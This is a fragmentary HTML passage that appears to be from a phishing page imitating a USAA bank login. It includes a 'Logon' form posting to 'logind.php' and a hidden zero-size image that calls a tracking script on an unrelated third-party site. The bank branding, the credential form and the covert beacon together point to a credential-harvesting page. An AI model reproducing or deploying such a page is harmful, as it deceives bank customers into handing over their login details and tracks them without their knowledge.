...
<script language="javaScript">
	...
	<li class="authenticationbar_list_item yuimenubaritem">
    	<form action="logind.php" method="post" id="Logon" name="Logon" onsubmit="return validateForm()" class="yuimenubaritemlabel" >
		
		
		<script type="text/javascript">
function validateForm()
{
var x=document.forms["Logon"]["userid"].value;
if (x==null || x=="")
  {
...
<img src="http://scuolasteinerlocarno.ch/traf//allmystats/visiteur.php?testpage" width=0 height=0>
	...
	<div id="legalText" class="accentAnchors">
		<div id="copyright"><p><span class="smallText">Copyright © 2015 USAA. </span></p></div>
